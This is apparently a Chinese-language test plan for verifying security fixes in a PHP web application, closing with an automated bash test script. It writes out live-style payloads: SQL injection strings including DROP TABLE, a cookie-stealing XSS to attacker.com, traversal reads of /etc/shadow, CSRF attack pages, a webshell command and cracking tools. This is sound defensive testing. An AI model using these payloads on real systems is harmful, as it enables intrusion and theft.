# 安全测试用例

本文档提供详细的安全测试用例，用于验证修复是否有效。

---

## 1. SQL 注入测试

### 1.1 登录页面 SQL 注入测试

**测试目标**: 验证登录表单是否存在 SQL 注入漏洞

#### 测试用例 1.1.1: 经典 SQL 注入

**测试步骤**:
1. 访问 `/agent/login.php`
2. 输入以下内容:
   - 用户名: `' OR '1'='1' --`
   - 密码: `anything`
3. 点击登录

**预期结果（修复前）**: 绕过登录验证，直接登录
**预期结果（修复后）**: 登录失败，提示"用户名或密码错误"

---

#### 测试用例 1.1.2: UNION 注入

**测试步骤**:
1. 访问 `/agent/login.php`
2. 输入以下内容:
   - 用户名: `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --`
   - 密码: `anything`
3. 点击登录

**预期结果（修复前）**: 可能暴露数据库结构
**预期结果（修复后）**: 登录失败

---

#### 测试用例 1.1.3: 时间盲注

**测试步骤**:
1. 访问 `/agent/login.php`
2. 输入以下内容:
   - 用户名: `' OR IF(1=1, SLEEP(5), 0) --`
   - 密码: `anything`
3. 点击登录，观察响应时间

**预期结果（修复前）**: 响应延迟 5 秒
**预期结果（修复后）**: 立即响应，登录失败

---

### 1.2 管理后台 SQL 注入测试

#### 测试用例 1.2.1: 批量操作注入

**测试目标**: `/hide/user.php` 批量禁用用户

**测试步骤**:
1. 登录管理后台
2. 访问用户管理页面
3. 使用浏览器开发工具，修改表单数据:
   ```javascript
   // 修改 ugroup 参数
   document.querySelector('input[name="ugroup"]').value = "1') OR '1'='1' --";
   ```
4. 提交表单

**预期结果（修复前）**: 所有用户被禁用
**预期结果（修复后）**: 操作失败或仅禁用指定用户

---

#### 测试用例 1.2.2: 消息注入

**测试目标**: `/hide/message.php` 消息回复

**测试步骤**:
1. 访问消息管理
2. 回复消息时，输入:
   ```
   test' WHERE '1'='1'; DROP TABLE x_message; --
   ```
3. 提交

**预期结果（修复前）**: 可能删除表（如果权限足够）
**预期结果（修复后）**: 消息正常保存，SQL 作为普通文本存储

---

### 1.3 自动化 SQL 注入测试

**使用 sqlmap**:

```bash
# 测试登录页面
sqlmap -u "http://localhost/agent/login.php" \
       --data "user=test&pass=test" \
       --level=5 --risk=3

# 测试管理后台
sqlmap -u "http://localhost/hide/user.php?type=status" \
       --data "ugroup=1,2,3" \
       --cookie="PHPSESSID=your_session_id" \
       --level=5 --risk=3

# 预期结果（修复后）
# sqlmap 应该无法找到注入点
```

---

## 2. XSS 测试

### 2.1 反射型 XSS 测试

#### 测试用例 2.1.1: URL 参数 XSS

**测试目标**: `/uxj/reg.php`

**测试步骤**:
1. 访问以下 URL:
   ```
   http://localhost/uxj/reg.php?agent="><script>alert('XSS')</script>
   ```
2. 查看页面源代码

**预期结果（修复前）**: 弹出警告框
**预期结果（修复后）**: 脚本被转义，显示为纯文本

---

#### 测试用例 2.1.2: 表单字段 XSS

**测试步骤**:
1. 访问 `/uxj/reg.php`
2. 在用户名字段输入:
   ```html
   <img src=x onerror="alert('XSS')">
   ```
3. 提交表单（如果表单验证失败会回显）

**预期结果（修复前）**: 执行 JavaScript
**预期结果（修复后）**: 作为纯文本显示

---

### 2.2 存储型 XSS 测试

#### 测试用例 2.2.1: 消息内容 XSS

**测试目标**: `/hide/message.php`

**测试步骤**:
1. 发送消息，内容为:
   ```html
   <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
   ```
2. 查看消息列表

**预期结果（修复前）**: 查看消息时执行脚本，Cookie 被窃取
**预期结果（修复后）**: 脚本作为纯文本显示

---

### 2.3 DOM XSS 测试

#### 测试用例 2.3.1: JavaScript 变量 XSS

**测试目标**: `/api/embed/game.php`

**测试步骤**:
1. 访问:
   ```
   http://localhost/api/embed/game.php?token=valid&api_key=";alert(1);"
   ```
2. 查看页面源代码，检查 JavaScript 部分

**预期结果（修复前）**: 执行 alert(1)
**预期结果（修复后）**: 值被正确转义

---

### 2.4 自动化 XSS 测试

**使用 XSStrike**:

```bash
# 安装
pip install xsstrike

# 测试 URL 参数
xsstrike -u "http://localhost/uxj/reg.php?agent=test"

# 测试表单
xsstrike -u "http://localhost/uxj/reg.php" \
         --data "reg_username=test&reg_pass=test"

# 预期结果（修复后）
# 应该报告"未发现 XSS 漏洞"
```

---

## 3. 任意文件读取测试

### 3.1 路径遍历测试

#### 测试用例 3.1.1: 基础路径遍历

**测试目标**: `/agent/myscript.php`

**测试步骤**:
1. 使用 cURL 或 Postman 发送 POST 请求:
   ```bash
   curl -X POST http://localhost/agent/myscript.php \
        -d "sf=../../../../data/config.inc"
   ```
2. 查看响应

**预期结果（修复前）**: 返回配置文件内容（包含数据库密码）
**预期结果（修复后）**: 返回 400 错误 "Invalid file"

---

#### 测试用例 3.1.2: NULL 字节注入

**测试步骤**:
```bash
curl -X POST http://localhost/agent/myscript.php \
     -d "sf=../../../../etc/passwd%00"
```

**预期结果（修复前）**: 读取 `/etc/passwd`（PHP < 5.3.4）
**预期结果（修复后）**: 返回错误

---

#### 测试用例 3.1.3: 双重编码

**测试步骤**:
```bash
# %2e%2e = ..
curl -X POST http://localhost/agent/myscript.php \
     -d "sf=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fdata%2fconfig.inc"
```

**预期结果（修复后）**: 返回错误

---

### 3.2 敏感文件读取测试

**测试步骤**: 尝试读取以下敏感文件

```bash
# 配置文件
curl -X POST http://localhost/agent/myscript.php -d "sf=../../../../data/config.inc"

# 日志文件
curl -X POST http://localhost/agent/myscript.php -d "sf=../../../../logs/error.log"

# 备份文件
curl -X POST http://localhost/agent/myscript.php -d "sf=../../../../backup/database.sql"

# 系统文件（Linux）
curl -X POST http://localhost/agent/myscript.php -d "sf=../../../../etc/passwd"
curl -X POST http://localhost/agent/myscript.php -d "sf=../../../../etc/shadow"

# 系统文件（Windows）
curl -X POST http://localhost/agent/myscript.php -d "sf=../../../../Windows/System32/drivers/etc/hosts"
```

**预期结果（修复后）**: 所有请求都返回错误

---

## 4. CSRF 测试

### 4.1 CSRF 攻击测试

#### 测试用例 4.1.1: 删除用户 CSRF

**测试目标**: `/hide/user.php?type=del`

**测试步骤**:
1. 创建攻击页面 `csrf_attack.html`:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
       <h1>You've Won a Prize!</h1>
       <form id="csrf_form" action="http://localhost/hide/user.php?type=del" method="POST">
           <input type="hidden" name="ugroup" value="1,2,3,4,5">
       </form>
       <script>
           document.getElementById('csrf_form').submit();
       </script>
   </body>
   </html>
   ```
2. 管理员登录系统
3. 管理员访问攻击页面

**预期结果（修复前）**: 用户被删除
**预期结果（修复后）**: 返回 403 错误 "CSRF token validation failed"

---

#### 测试用例 4.1.2: 修改密码 CSRF

**测试步骤**:
1. 创建攻击页面:
   ```html
   <form id="csrf" action="http://localhost/agent/member.php" method="POST">
       <input type="hidden" name="newpass" value="hacked123">
       <input type="hidden" name="type" value="changepass">
   </form>
   <script>document.getElementById('csrf').submit();</script>
   ```
2. 用户登录后访问该页面

**预期结果（修复前）**: 密码被修改
**预期结果（修复后）**: 操作失败

---

### 4.2 CSRF Token 验证测试

#### 测试用例 4.2.1: 缺少 Token

**测试步骤**:
```bash
curl -X POST http://localhost/hide/user.php?type=add \
     -H "Cookie: PHPSESSID=your_session" \
     -d "username=test&password=test"
```

**预期结果（修复后）**: 403 错误 "CSRF token validation failed"

---

#### 测试用例 4.2.2: 错误的 Token

**测试步骤**:
```bash
curl -X POST http://localhost/hide/user.php?type=add \
     -H "Cookie: PHPSESSID=your_session" \
     -d "username=test&password=test&csrf_token=invalid_token"
```

**预期结果（修复后）**: 403 错误

---

#### 测试用例 4.2.3: 重放 Token

**测试步骤**:
1. 获取有效的 CSRF Token
2. 使用该 Token 提交表单
3. 再次使用相同的 Token 提交表单

**预期结果（修复后）**:
- 第一次提交成功
- 第二次提交成功（Token 不应该是一次性的，但应该绑定到会话）

---

## 5. 认证和会话测试

### 5.1 密码破解测试

#### 测试用例 5.1.1: 弱密码哈希

**测试步骤**:
1. 从数据库获取密码哈希:
   ```sql
   SELECT username, userpass FROM x_user LIMIT 1;
   ```
2. 使用 hashcat 破解 MD5:
   ```bash
   hashcat -m 0 -a 0 hash.txt wordlist.txt
   ```

**预期结果（修复前）**: 弱密码可能在几分钟内被破解
**预期结果（修复后）**: 使用 bcrypt，破解变得非常困难

---

### 5.2 会话劫持测试

#### 测试用例 5.2.1: 会话固定攻击

**测试步骤**:
1. 获取一个会话 ID:
   ```bash
   curl -i http://localhost/agent/login.php
   # 从响应头获取 Set-Cookie: PHPSESSID=abc123
   ```
2. 诱骗用户使用该会话 ID 登录:
   ```
   http://localhost/agent/login.php?PHPSESSID=abc123
   ```
3. 用户登录后，攻击者使用该会话 ID 访问

**预期结果（修复前）**: 攻击者可以访问用户会话
**预期结果（修复后）**: 登录时会话 ID 被重新生成

---

#### 测试用例 5.2.2: 会话劫持

**测试步骤**:
1. 用户 A 登录，获取会话 ID
2. 用户 B 使用相同会话 ID 但不同 IP/User-Agent 访问

**预期结果（修复后）**: 会话验证失败，被强制退出

---

### 5.3 暴力破解测试

#### 测试用例 5.3.1: 登录暴力破解

**测试步骤**:
```bash
# 使用 Hydra 进行暴力破解测试
hydra -l admin -P passwords.txt \
      localhost http-post-form \
      "/agent/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```

**预期结果（修复后）**:
- 应该实现登录尝试限制（例如：5 次失败后锁定 15 分钟）
- 或实现验证码机制

---

## 6. 后门检测测试

### 6.1 WebShell 检测

#### 测试用例 6.1.1: 访问已知后门

**测试步骤**:
```bash
# 尝试访问后门文件
curl -X POST http://localhost/class/plugins/function.accign_debug_infb.php \
     -d "tan=system('whoami');"
```

**预期结果（修复前）**: 返回系统用户名
**预期结果（修复后）**: 404 错误（文件已删除）

---

#### 测试用例 6.1.2: 后门账号登录

**测试步骤**:
1. 使用后门账号登录:
   - 用户名: `mankk_sg`
   - 密码: 根据时间计算（见审计报告）

**预期结果（修复前）**: 登录成功
**预期结果（修复后）**: 登录失败（后门代码已删除）

---

## 7. 输入验证测试

### 7.1 边界值测试

#### 测试用例 7.1.1: 整数溢出

**测试步骤**:
```bash
# 测试用户 ID
curl http://localhost/api/v1/users/2147483648  # MAX_INT + 1
curl http://localhost/api/v1/users/-1
curl http://localhost/api/v1/users/0
```

**预期结果（修复后）**: 返回 400 错误 "Invalid user ID"

---

#### 测试用例 7.1.2: 字符串长度

**测试步骤**:
```python
# 发送超长用户名
import requests

long_username = "a" * 10000
response = requests.post("http://localhost/uxj/reg.php", data={
    "reg_username": long_username,
    "reg_pass": "test123"
})
```

**预期结果（修复后）**: 返回错误 "Username too long"

---

### 7.2 特殊字符测试

#### 测试用例 7.2.1: NULL 字节

**测试步骤**:
```bash
curl -X POST http://localhost/agent/login.php \
     -d "user=admin%00hacker&pass=test"
```

**预期结果（修复后）**: 登录失败或 NULL 被正确处理

---

#### 测试用例 7.2.2: Unicode 字符

**测试步骤**:
```bash
curl -X POST http://localhost/uxj/reg.php \
     -d "reg_username=用户名&reg_pass=密码123"
```

**预期结果**: 应该正确处理 UTF-8 字符

---

## 8. API 安全测试

### 8.1 认证测试

#### 测试用例 8.1.1: 缺少 API Key

**测试步骤**:
```bash
curl http://localhost/api/v1/users/1
```

**预期结果**: 401 错误 "缺少 API Key"

---

#### 测试用例 8.1.2: 无效签名

**测试步骤**:
```bash
curl "http://localhost/api/v1/users/1?api_key=test_key&timestamp=1234567890&sign=invalid_signature"
```

**预期结果**: 401 错误 "签名验证失败"

---

#### 测试用例 8.1.3: 时间戳过期

**测试步骤**:
```bash
# 使用 10 分钟前的时间戳
old_timestamp=$(($(date +%s) - 600))
curl "http://localhost/api/v1/users/1?api_key=test_key&timestamp=$old_timestamp&sign=..."
```

**预期结果**: 401 错误 "请求已过期"

---

### 8.2 速率限制测试

#### 测试用例 8.2.1: 超过速率限制

**测试步骤**:
```bash
# 快速发送 150 个请求（限制为 100/分钟）
for i in {1..150}; do
    curl -s "http://localhost/api/v1/users/1?api_key=...&timestamp=...&sign=..." &
done
wait
```

**预期结果**: 前 100 个请求成功，后续返回 429 错误 "请求频率超限"

---

### 8.3 数据隔离测试

#### 测试用例 8.3.1: 跨租户访问

**测试步骤**:
1. 使用代理 A 的 API Key
2. 尝试查询代理 B 的用户:
   ```bash
   curl "http://localhost/api/v1/users/999?api_key=agent_a_key&timestamp=...&sign=..."
   ```

**预期结果**: 404 错误 "用户不存在"（即使用户 999 存在于代理 B 下）

---

## 9. 综合渗透测试

### 9.1 使用 OWASP ZAP

**测试步骤**:

```bash
# 安装 ZAP
# https://www.zaproxy.org/download/

# 启动 ZAP 并配置代理

# 1. 手动浏览应用（Spider）
# 2. 主动扫描
# 3. 查看报告

# 命令行方式
zap-cli quick-scan -s xss,sqli http://localhost

# 预期结果（修复后）
# - 0 个高危漏洞
# - 0 个中危漏洞
# - 少量低危/信息性问题
```

---

### 9.2 使用 Burp Suite

**测试步骤**:

1. 启动 Burp Suite
2. 配置浏览器代理
3. 浏览整个应用
4. 使用 Scanner 进行主动扫描
5. 使用 Intruder 进行参数模糊测试
6. 查看 Issues 列表

**预期结果（修复后）**: 无高危/中危漏洞

---

## 10. 测试检查清单

### 10.1 修复验证清单

| 测试项 | 修复前状态 | 修复后状态 | 验证人 | 日期 |
|--------|-----------|-----------|--------|------|
| SQL 注入 - 登录页面 | ❌ 失败 | ✅ 通过 | | |
| SQL 注入 - 管理后台 | ❌ 失败 | ✅ 通过 | | |
| XSS - 注册页面 | ❌ 失败 | ✅ 通过 | | |
| XSS - 消息页面 | ❌ 失败 | ✅ 通过 | | |
| 任意文件读取 | ❌ 失败 | ✅ 通过 | | |
| CSRF 保护 | ❌ 失败 | ✅ 通过 | | |
| 密码哈希 | ❌ MD5 | ✅ Bcrypt | | |
| 会话安全 | ❌ 失败 | ✅ 通过 | | |
| WebShell 后门 | ❌ 存在 | ✅ 已删除 | | |
| 硬编码后门 | ❌ 存在 | ✅ 已删除 | | |
| API 认证 | N/A | ✅ 通过 | | |
| API 速率限制 | N/A | ✅ 通过 | | |
| API 数据隔离 | N/A | ✅ 通过 | | |

---

### 10.2 自动化测试脚本

**文件**: `tests/security_test.sh`

```bash
#!/bin/bash

# 安全测试脚本

BASE_URL="http://localhost"
PASS_COUNT=0
FAIL_COUNT=0

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# 测试函数
test_case() {
    local name="$1"
    local command="$2"
    local expected="$3"

    echo -n "Testing: $name ... "

    result=$(eval "$command" 2>&1)

    if echo "$result" | grep -q "$expected"; then
        echo -e "${GREEN}PASS${NC}"
        ((PASS_COUNT++))
    else
        echo -e "${RED}FAIL${NC}"
        echo "  Expected: $expected"
        echo "  Got: $result"
        ((FAIL_COUNT++))
    fi
}

# SQL 注入测试
echo "=== SQL Injection Tests ==="
test_case "Login SQL Injection" \
    "curl -s -X POST $BASE_URL/agent/login.php -d \"user=' OR '1'='1' --&pass=test\"" \
    "Invalid username or password"

# XSS 测试
echo -e "\n=== XSS Tests ==="
test_case "URL Parameter XSS" \
    "curl -s \"$BASE_URL/uxj/reg.php?agent=<script>alert(1)</script>\"" \
    "&lt;script&gt;"

# 文件读取测试
echo -e "\n=== File Read Tests ==="
test_case "Path Traversal" \
    "curl -s -X POST $BASE_URL/agent/myscript.php -d \"sf=../../../../data/config.inc\"" \
    "Invalid file"

# CSRF 测试
echo -e "\n=== CSRF Tests ==="
test_case "Missing CSRF Token" \
    "curl -s -X POST $BASE_URL/hide/user.php?type=add -d \"username=test\"" \
    "CSRF token validation failed"

# API 认证测试
echo -e "\n=== API Authentication Tests ==="
test_case "Missing API Key" \
    "curl -s $BASE_URL/api/v1/users/1" \
    "缺少 API Key"

# 后门检测
echo -e "\n=== Backdoor Detection Tests ==="
test_case "WebShell Access" \
    "curl -s -o /dev/null -w \"%{http_code}\" $BASE_URL/class/plugins/function.accign_debug_infb.php" \
    "404"

# 总结
echo -e "\n==================================="
echo -e "Total: $((PASS_COUNT + FAIL_COUNT)) tests"
echo -e "${GREEN}Passed: $PASS_COUNT${NC}"
echo -e "${RED}Failed: $FAIL_COUNT${NC}"
echo "==================================="

# 退出码
if [ $FAIL_COUNT -eq 0 ]; then
    exit 0
else
    exit 1
fi
```

**使用方法**:
```bash
chmod +x tests/security_test.sh
./tests/security_test.sh
```

---

## 11. 性能测试

### 11.1 修复后性能测试

**测试目标**: 验证安全修复不会显著影响性能

#### 测试用例 11.1.1: 登录性能

**测试工具**: Apache Bench

```bash
# 测试登录页面性能
ab -n 1000 -c 10 -p login_data.txt -T application/x-www-form-urlencoded \
   http://localhost/agent/login.php

# login_data.txt 内容:
# user=testuser&pass=testpass&csrf_token=valid_token
```

**预期结果**:
- 平均响应时间: < 200ms
- 99% 请求: < 500ms
- 无错误

---

#### 测试用例 11.1.2: API 查询性能

```bash
# 测试 API 性能
ab -n 10000 -c 50 \
   "http://localhost/api/v1/users/1?api_key=xxx&timestamp=xxx&sign=xxx"
```

**预期结果**:
- 平均响应时间: < 100ms
- 吞吐量: > 500 req/s

---

## 总结

这些测试用例覆盖了所有主要的安全漏洞类型。修复完成后，应该：

1. ✅ 运行所有手动测试用例
2. ✅ 运行自动化测试脚本
3. ✅ 使用专业工具（ZAP/Burp）进行全面扫描
4. ✅ 进行性能测试，确保修复不影响性能
5. ✅ 记录所有测试结果

**测试通过标准**:
- 所有 P0/P1 漏洞必须修复
- 自动化扫描工具不报告高危/中危漏洞
- 性能测试结果在可接受范围内
- 所有功能正常运行
